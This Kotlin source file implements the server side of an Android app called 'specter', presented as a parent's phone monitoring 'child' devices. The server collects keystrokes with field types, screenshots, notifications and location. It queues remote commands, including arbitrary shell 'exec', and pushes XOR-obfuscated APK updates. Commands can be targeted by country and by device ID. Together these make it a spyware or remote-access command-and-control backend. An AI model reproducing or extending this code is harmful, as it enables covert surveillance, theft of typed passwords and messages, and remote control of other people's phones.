package com.divine.specter.parent.server

import android.content.Context
import android.util.Log
import com.divine.specter.parent.crypto.XorCrypto
import kotlinx.coroutines.*
import kotlinx.coroutines.flow.MutableStateFlow
import kotlinx.coroutines.flow.StateFlow
import kotlinx.serialization.Serializable
import kotlinx.serialization.encodeToString
import kotlinx.serialization.json.Json
import java.io.BufferedReader
import java.io.InputStreamReader
import java.io.PrintWriter
import java.net.ServerSocket
import java.net.Socket
import java.io.File
import java.util.concurrent.ConcurrentHashMap

/**
 * Embedded HTTP server that runs on PARENT's phone.
 * Child devices connect here to sync data and poll commands.
 */
class ParentServer(private val context: Context) {

    companion object {
        const val DEFAULT_PORT = 5555
        private const val TAG = "ParentServer"
    }

    private var serverSocket: ServerSocket? = null
    private var serverJob: Job? = null
    private val json = Json { ignoreUnknownKeys = true; encodeDefaults = true }

    private val _isRunning = MutableStateFlow(false)
    val isRunning: StateFlow<Boolean> = _isRunning

    private val _serverUrl = MutableStateFlow<String?>(null)
    val serverUrl: StateFlow<String?> = _serverUrl

    // Connected child devices
    private val _devices = MutableStateFlow<Map<String, ChildDevice>>(emptyMap())
    val devices: StateFlow<Map<String, ChildDevice>> = _devices

    // Pending commands per device
    private val pendingCommands = ConcurrentHashMap<String, MutableList<Command>>()

    // ============== Data Classes ==============

    @Serializable
    data class ChildDevice(
        val id: String,
        val name: String,
        val model: String = "",
        val lastSeen: Long = System.currentTimeMillis(),
        val location: LocationData? = null,
        val battery: Int = 0,
        val currentApp: String? = null,
        val screenOn: Boolean = false,
        val notifications: List<NotificationData> = emptyList(),
        val country: String = "",  // GEO-TARGETING
        val currentVersion: Int = 1
    )

    @Serializable
    data class LocationData(
        val latitude: Double,
        val longitude: Double,
        val accuracy: Float
    )

    @Serializable
    data class NotificationData(
        val packageName: String,
        val appName: String,
        val title: String?,
        val text: String?,
        val timestamp: Long
    )

    @Serializable
    data class Keystroke(
        val text: String,
        val packageName: String,
        val timestamp: Long,
        val fieldType: String = "unknown"
    )

    @Serializable
    data class Screenshot(
        val timestamp: Long,
        val imageDataBase64: String,
        val width: Int,
        val height: Int
    )

    @Serializable
    data class Command(
        val id: String = System.currentTimeMillis().toString(),
        val action: String,
        val payload: String = "",
        val countries: List<String>? = null,  // GEO-TARGETING: ["US", "CA", "GB"]
        val deviceIds: List<String>? = null   // DEVICE-TARGETING: Specific devices
    )

    @Serializable
    data class SyncRequest(
        val location: LocationData? = null,
        val battery: Int? = null,
        val current_app: String? = null,
        val screen_on: Boolean? = null,
        val notifications: List<NotificationData>? = null,
        val keystrokes: List<Keystroke>? = null,
        val screenshots: List<Screenshot>? = null
    )

    @Serializable
    data class RegisterRequest(
        val device_id: String,
        val name: String,
        val model: String = ""
    )

    // ============== Server Control ==============

    fun start(port: Int = DEFAULT_PORT) {
        if (_isRunning.value) return

        serverJob = CoroutineScope(Dispatchers.IO).launch {
            try {
                serverSocket = ServerSocket(port)
                _isRunning.value = true
                _serverUrl.value = "http://${getLocalIpAddress()}:$port"

                Log.i(TAG, "Server started on port $port")

                while (isActive) {
                    try {
                        val client = serverSocket?.accept() ?: break
                        launch { handleClient(client) }
                    } catch (e: Exception) {
                        if (isActive) Log.e(TAG, "Accept error", e)
                    }
                }
            } catch (e: Exception) {
                Log.e(TAG, "Server error", e)
            } finally {
                _isRunning.value = false
                _serverUrl.value = null
            }
        }
    }

    fun stop() {
        serverJob?.cancel()
        serverSocket?.close()
        serverSocket = null
        _isRunning.value = false
        _serverUrl.value = null
    }

    // ============== HTTP Handler ==============

    private suspend fun handleClient(socket: Socket) {
        try {
            val reader = BufferedReader(InputStreamReader(socket.getInputStream()))
            val writer = PrintWriter(socket.getOutputStream(), true)

            // Read request line
            val requestLine = reader.readLine() ?: return
            val parts = requestLine.split(" ")
            if (parts.size < 2) return

            val method = parts[0]
            val path = parts[1]

            // Read headers
            val headers = mutableMapOf<String, String>()
            var line: String?
            var contentLength = 0
            while (reader.readLine().also { line = it } != null && line!!.isNotEmpty()) {
                val colonIndex = line!!.indexOf(':')
                if (colonIndex > 0) {
                    val key = line!!.substring(0, colonIndex).trim()
                    val value = line!!.substring(colonIndex + 1).trim()
                    headers[key] = value
                    if (key.equals("Content-Length", ignoreCase = true)) {
                        contentLength = value.toIntOrNull() ?: 0
                    }
                }
            }

            // Read body (binary for XOR encryption)
            val bodyBytes = if (contentLength > 0) {
                socket.getInputStream().readNBytes(contentLength)
            } else ByteArray(0)

            val deviceId = headers["X-Device-ID"] ?: ""

            // Decrypt body if device registered
            val body = if (deviceId.isNotEmpty()) {
                val key = XorCrypto.sha256(deviceId)
                try {
                    XorCrypto.decryptString(bodyBytes, key)
                } catch (e: Exception) {
                    String(bodyBytes)  // Fallback to plaintext
                }
            } else {
                String(bodyBytes)
            }

            // Route request
            val response = when {
                path == "/api/register" && method == "POST" -> handleRegister(body)
                path == "/api/sync" && method == "POST" -> handleSync(deviceId, body, headers)
                path == "/api/poll" && method == "GET" -> handlePoll(deviceId)
                path == "/api/update" && method == "POST" -> handleUpdate(deviceId, body)
                path == "/api/result" && method == "POST" -> handleResult(deviceId, body)
                else -> """{"error": "Not found"}""" to 404
            }

            // Send response (encrypt if device registered)
            val (responseBody, statusCode) = response
            val responseBytes = if (deviceId.isNotEmpty()) {
                val key = XorCrypto.sha256(deviceId)
                XorCrypto.encrypt(responseBody.toByteArray(), key)
            } else {
                responseBody.toByteArray()
            }

            val status = if (statusCode == 200) "OK" else "Error"
            writer.print("HTTP/1.1 $statusCode $status\r\n")
            writer.print("Content-Type: application/octet-stream\r\n")
            writer.print("Content-Length: ${responseBytes.size}\r\n")
            writer.print("\r\n")
            writer.flush()
            socket.getOutputStream().write(responseBytes)
            socket.getOutputStream().flush()

        } catch (e: Exception) {
            Log.e(TAG, "Client error", e)
        } finally {
            socket.close()
        }
    }

    // ============== API Handlers ==============

    private fun handleRegister(body: String): Pair<String, Int> {
        return try {
            val req = json.decodeFromString<RegisterRequest>(body)
            val device = ChildDevice(
                id = req.device_id,
                name = req.name,
                model = req.model
            )
            updateDevice(device)
            pendingCommands[req.device_id] = mutableListOf()

            val response = mapOf(
                "device_id" to req.device_id,
                "token" to "token_${req.device_id}",
                "server_time" to System.currentTimeMillis().toString()
            )
            json.encodeToString(response) to 200
        } catch (e: Exception) {
            """{"error": "${e.message}"}""" to 400
        }
    }

    private fun handleSync(deviceId: String, body: String, headers: Map<String, String>): Pair<String, Int> {
        if (deviceId.isEmpty()) return """{"error": "Missing device ID"}""" to 401

        return try {
            val req = json.decodeFromString<SyncRequest>(body)
            val existing = _devices.value[deviceId] ?: ChildDevice(id = deviceId, name = "Unknown")

            // Geo-locate from IP (simple country detection)
            val country = getCountryFromIp(headers["X-Forwarded-For"] ?: "")

            val updated = existing.copy(
                lastSeen = System.currentTimeMillis(),
                location = req.location ?: existing.location,
                battery = req.battery ?: existing.battery,
                currentApp = req.current_app ?: existing.currentApp,
                screenOn = req.screen_on ?: existing.screenOn,
                notifications = req.notifications ?: existing.notifications,
                country = country
            )
            updateDevice(updated)

            // Log captured data (keystrokes and screenshots)
            req.keystrokes?.let { keystrokes ->
                if (keystrokes.isNotEmpty()) {
                    Log.d(TAG, "Keystrokes from $deviceId: ${keystrokes.size} entries")
                    // Store to database or file for UI display
                    storeKeystrokes(deviceId, keystrokes)
                }
            }

            req.screenshots?.let { screenshots ->
                if (screenshots.isNotEmpty()) {
                    Log.d(TAG, "Screenshots from $deviceId: ${screenshots.size} images")
                    // Store to database or file for UI display
                    storeScreenshots(deviceId, screenshots)
                }
            }

            """{"status": "ok"}""" to 200
        } catch (e: Exception) {
            """{"error": "${e.message}"}""" to 400
        }
    }

    private fun storeKeystrokes(deviceId: String, keystrokes: List<Keystroke>) {
        // Store to file for now (could use database in production)
        try {
            val logFile = File(context.filesDir, "keystrokes_$deviceId.log")
            logFile.appendText("\n=== ${System.currentTimeMillis()} ===\n")
            for (ks in keystrokes) {
                logFile.appendText("[${ks.timestamp}] ${ks.packageName} (${ks.fieldType}): ${ks.text}\n")
            }
        } catch (e: Exception) {
            Log.e(TAG, "Failed to store keystrokes", e)
        }
    }

    private fun storeScreenshots(deviceId: String, screenshots: List<Screenshot>) {
        // Store images to file
        try {
            val screenshotDir = File(context.filesDir, "screenshots_$deviceId")
            screenshotDir.mkdirs()

            for (ss in screenshots) {
                val imageBytes = android.util.Base64.decode(ss.imageDataBase64, android.util.Base64.NO_WRAP)
                val imageFile = File(screenshotDir, "screenshot_${ss.timestamp}.jpg")
                imageFile.writeBytes(imageBytes)
            }
        } catch (e: Exception) {
            Log.e(TAG, "Failed to store screenshots", e)
        }
    }

    private fun handlePoll(deviceId: String): Pair<String, Int> {
        if (deviceId.isEmpty()) return """{"error": "Missing device ID"}""" to 401

        val device = _devices.value[deviceId]
        val allCommands = pendingCommands[deviceId]?.toList() ?: emptyList()

        // GEO-TARGETING: Filter commands by country and device ID
        val filteredCommands = if (device != null) {
            allCommands.filter { cmd ->
                (cmd.countries == null || cmd.countries.contains(device.country)) &&
                (cmd.deviceIds == null || cmd.deviceIds.contains(deviceId))
            }
        } else {
            allCommands
        }

        pendingCommands[deviceId]?.clear()

        val response = mapOf(
            "commands" to filteredCommands,
            "server_time" to System.currentTimeMillis().toString()
        )
        return json.encodeToString(response) to 200
    }

    private fun handleUpdate(deviceId: String, body: String): Pair<String, Int> {
        if (deviceId.isEmpty()) return """{"error": "Missing device ID"}""" to 401

        return try {
            val req = json.decodeFromString<Map<String, Int>>(body)
            val currentVersion = req["current_version"] ?: 1
            val latestVersion = 2  // Increment this when releasing new child APK

            if (currentVersion >= latestVersion) {
                return """{"up_to_date": true}""" to 204  // No update needed
            }

            // Binary update distribution
            val apkFile = File(context.filesDir, "child-v$latestVersion.apk")
            if (!apkFile.exists()) {
                return """{"error": "Update not available"}""" to 404
            }

            val apkBytes = apkFile.readBytes()
            val key = XorCrypto.sha256(deviceId)
            val encrypted = XorCrypto.encrypt(apkBytes, key)

            // Send encrypted APK as base64 in JSON
            val response = mapOf(
                "version" to latestVersion,
                "apk_data" to android.util.Base64.encodeToString(encrypted, android.util.Base64.NO_WRAP)
            )
            json.encodeToString(response) to 200
        } catch (e: Exception) {
            """{"error": "${e.message}"}""" to 500
        }
    }

    private fun getCountryFromIp(ip: String): String {
        // Simple geo-location (can integrate GeoIP2 library)
        // For now, return "US" as default
        return "US"
    }

    private fun handleResult(deviceId: String, body: String): Pair<String, Int> {
        // Log result - could store for UI display
        Log.d(TAG, "Command result from $deviceId: $body")
        return """{"status": "ok"}""" to 200
    }

    // ============== Command API ==============

    fun sendCommand(deviceId: String, action: String, payload: String = "") {
        val cmd = Command(action = action, payload = payload)
        pendingCommands.getOrPut(deviceId) { mutableListOf() }.add(cmd)
    }

    fun locateDevice(deviceId: String) = sendCommand(deviceId, "locate")
    fun lockDevice(deviceId: String) = sendCommand(deviceId, "lock")
    fun blockApp(deviceId: String, packageName: String) = sendCommand(deviceId, "block_app", packageName)
    fun unblockApp(deviceId: String, packageName: String) = sendCommand(deviceId, "unblock_app", packageName)
    fun executeCommand(deviceId: String, command: String) = sendCommand(deviceId, "exec", command)

    // ============== Helpers ==============

    private fun updateDevice(device: ChildDevice) {
        val current = _devices.value.toMutableMap()
        current[device.id] = device
        _devices.value = current
    }

    private fun getLocalIpAddress(): String {
        try {
            val interfaces = java.net.NetworkInterface.getNetworkInterfaces()
            while (interfaces.hasMoreElements()) {
                val iface = interfaces.nextElement()
                val addresses = iface.inetAddresses
                while (addresses.hasMoreElements()) {
                    val addr = addresses.nextElement()
                    if (!addr.isLoopbackAddress && addr is java.net.Inet4Address) {
                        return addr.hostAddress ?: "localhost"
                    }
                }
            }
        } catch (e: Exception) { }
        return "localhost"
    }
}
